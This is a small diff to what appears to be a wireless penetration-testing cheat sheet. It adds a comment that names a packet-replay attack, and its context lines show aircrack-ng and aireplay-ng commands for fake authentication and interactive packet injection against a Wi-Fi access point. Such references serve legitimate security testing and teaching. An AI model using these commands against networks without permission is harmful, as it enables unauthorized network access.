@@ -238,6 +238,7 @@ aircrack-ng -0 [CAPTURE FILE]
 -- Only in range of client
 -- Restrictions on AP
 aireplay-ng -1 60 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0 # Fake Authentication
+#Below attack is called Natural injection
 aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m68 -n 86 mon0
 # -2 Interactive packet replay attack
 # -d Destination Address  (FF:FF:FF:FF:FF:FF = Broadcast Address)
